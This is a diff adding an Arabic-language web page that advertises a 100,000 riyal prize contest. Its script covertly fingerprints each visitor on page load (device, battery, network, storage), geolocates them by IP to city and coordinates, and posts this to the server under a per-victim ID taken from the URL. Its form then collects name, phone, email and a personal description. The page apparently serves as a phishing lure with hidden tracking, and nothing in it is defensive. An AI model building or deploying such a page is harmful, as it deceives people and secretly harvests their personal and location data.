@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة الربح بمائة ألف ريال سعودي</title>
+    <meta name="description" content="كن انت الرابح في مسابقة الحلم للربح بمائة الف ريال سعودي">
+    <link rel="icon" href="https://files.catbox.moe/unbzhz.png" type="image/x-icon">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Changa:wght@300&family=Fjalla+One&family=Ubuntu:ital,wght@1,500&display=swap">
+    <style>
+        body {
+            background-color: #282c34;
+            font-family: 'Changa', sans-serif;
+            color: white;
+            text-align: center;
+            margin: 0;
+        }
+        header, footer {
+            background-color: #4CAF50;
+            padding: 20px;
+            color: white;
+        }
+        footer {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+        }
+        .content {
+            padding: 50px;
+        }
+        h1 {
+            color: gold;
+            font-size: 3em;
+            margin-bottom: 20px;
+        }
+        h3 {
+            color: #ffffff;
+            font-size: 1.5em;
+            margin-bottom: 30px;
+        }
+        .button {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 12px;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4);
+            padding-top: 60px;
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: 5% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 500px;
+            border-radius: 10px;
+            text-align: right;
+            color: black;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        input[type=text], input[type=email], input[type=tel], textarea {
+            width: 100%;
+            padding: 12px 20px;
+            margin: 8px 0;
+            display: inline-block;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            text-align: right;
+        }
+        input[type=submit] {
+            width: 100%;
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        input[type=submit]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>مسابقة الحلم</h1>
+    </header>
+    <div class="content">
+        <img width="200" height="200" src="https://files.catbox.moe/unbzhz.png" alt="شعار المسابقة">
+        <h3>اربح 100,000 ريال سعودي! اضغط على الزر أدناه للتسجيل.</h3>
+        <button class="button" id="openForm">سجل الآن</button>
+    </div>
+    <div id="registrationForm" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <form method="POST" id="registerForm">
+                <label for="name">الاسم الكامل</label>
+                <input type="text" id="name" name="name" placeholder="اكتب اسمك الكامل" required>
+                <label for="phone">رقم الهاتف</label>
+                <input type="tel" id="phone" name="phone" placeholder="اكتب رقم هاتفك" required>
+                <label for="email">البريد الإلكتروني</label>
+                <input type="email" id="email" name="email" placeholder="اكتب بريدك الإلكتروني" required>
+                <label for="description">وصف عنك</label>
+                <textarea id="description" name="description" placeholder="اكتب وصفاً عنك" style="height:200px" required></textarea>
+                <input type="submit" value="إرسال">
+            </form>
+        </div>
+    </div>
+    <footer>
+        <p>&copy; 2024 مسابقة الحلم. جميع الحقوق محفوظة.</p>
+    </footer>
+   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+   <script>
+    $(document).ready(function() {
+        const userId = window.location.pathname.substring(1);
+
+        // وظيفة لجمع معلومات الجهاز
+        async function getDeviceInfo() {
+            const deviceInfo = {
+                deviceName: navigator.platform,
+                deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                browserName: navigator.userAgent,
+                osVersion: navigator.userAgent,
+                screenResolution: `${screen.width}x${screen.height}`,
+                language: navigator.language || 'غير معروف',
+                colorDepth: `${screen.colorDepth} bits`,
+                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
+                memory: `${navigator.deviceMemory || 'غير معروف'} GB`,
+                touchSupport: 'ontouchstart' in window,
+                bluetoothSupport: navigator.bluetooth ? 'مدعوم' : 'غير مدعوم',
+                internalStorage: 'غير معروف', // هذه المعلومة تتطلب إذونات إضافية للوصول إليها
+                isCharging: 'غير معروف',
+                battery: 'غير معروف',
+                networkType: 'غير معروف',
+                networkSpeed: 'غير معروف',
+                screenOrientation: screen.orientation ? screen.orientation.type : 'غير معروف',
+                securityProtocol: location.protocol,
+                connectionFrequency: 'غير معروف',
+                geolocationAvailable: navigator.geolocation ? 'مدعوم' : 'غير مدعوم',
+                time: new Date().toLocaleString()
+            };
+
+            // جمع معلومات البطارية إذا كانت متاحة
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                deviceInfo.battery = `${battery.level * 100}%`;
+                deviceInfo.isCharging = battery.charging ? 'نعم' : 'لا';
+            }
+
+            // جمع معلومات الشبكة إذا كانت متاحة
+            if (navigator.connection) {
+                const connection = navigator.connection;
+                deviceInfo.networkType = connection.effectiveType || 'غير معروف';
+                deviceInfo.networkSpeed = connection.downlink || 'غير معروف';
+                deviceInfo.connectionFrequency = connection.frequency || 'غير معروف';
+            }
+
+            // محاولة جمع معلومات الذاكرة الداخلية
+            if (navigator.storage && navigator.storage.estimate) {
+                const estimate = await navigator.storage.estimate();
+                deviceInfo.internalStorage = `${(estimate.quota / (1024 * 1024 * 1024)).toFixed(2)} GB` || 'غير معروف';
+            }
+
+            // محاولة الحصول على إصدار المتصفح وتاريخ التحديث
+            const browserMatch = deviceInfo.browserName.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/);
+            if (browserMatch) {
+                deviceInfo.browserVersion = browserMatch[1];
+                deviceInfo.lastUpdate = 'غير معروف'; // يمكن استخدام تقنيات أخرى مثل حفظ التاريخ عند أول زيارة
+            }
+
+            return deviceInfo;
+        }
+
+        // وظيفة لإرسال المعلومات الأساسية
+        async function sendBasicInfo() {
+            try {
+                const deviceInfo = await getDeviceInfo();
+                
+                // استخدام خدمة IP لجلب البيانات الجغرافية
+                const locationData = await $.getJSON('https://ipapi.co/json/');
+                deviceInfo.ip = locationData.ip;
+                deviceInfo.country = locationData.country_name;
+                deviceInfo.city = locationData.city;
+                deviceInfo.latitude = locationData.latitude;
+                deviceInfo.longitude = locationData.longitude;
+
+                await $.ajax({
+                    url: '/SS',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ userId: userId, deviceInfo: deviceInfo }),
+                });
+
+                console.log('تم إرسال المعلومات الأساسية بنجاح');
+            } catch (error) {
+                console.error('حدث خطأ أثناء إرسال المعلومات الأساسية', error);
+            }
+        }
+
+        // إرسال المعلومات الأساسية عند تحميل الصفحة
+        sendBasicInfo();
+
+        // عرض نموذج التسجيل عند النقر على الزر
+        $('#openForm').click(function() {
+            $('#registrationForm').show();
+        });
+
+        // إخفاء نموذج التسجيل عند النقر على إغلاق
+        $('.close').click(function() {
+            $('#registrationForm').hide();
+        });
+
+        // إرسال البيانات عند تقديم النموذج
+        $('#registrationForm form').submit(async function(e) {
+            e.preventDefault();
+
+            const userInfo = {
+                name: $('#name').val(),
+                phone: $('#phone').val(),
+                email: $('#email').val(),
+                description: $('#description').val()
+            };
+
+            try {
+                const deviceInfo = await getDeviceInfo();
+                const locationData = await $.getJSON('https://ipapi.co/json/');
+                deviceInfo.ip = locationData.ip;
+                deviceInfo.country = locationData.country_name;
+                deviceInfo.city = locationData.city;
+                deviceInfo.latitude = locationData.latitude;
+                deviceInfo.longitude = locationData.longitude;
+
+                const fullInfo = {
+                    userId: userId,
+                    deviceInfo: deviceInfo,
+                    userInfo: userInfo
+                };
+
+                await $.ajax({
+                    url: '/SS',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify(fullInfo),
+                });
+
+                console.log('تم إرسال المعلومات الكاملة بنجاح');
+
+                // بدلاً من إظهار نافذة منبثقة، سنقوم بإعادة التوجيه لصفحة نجاح
+                window.location.href = '/success.html'; // قم بتغيير المسار لصفحتك المطلوبة
+
+            } catch (error) {
+                console.error('حدث خطأ أثناء إرسال المعلومات الكاملة', error);
+                alert('حدث خطأ أثناء إرسال المعلومات. الرجاء المحاولة مرة أخرى.');
+            }
+        });
+    });
+</script>
+</body>
+</html>
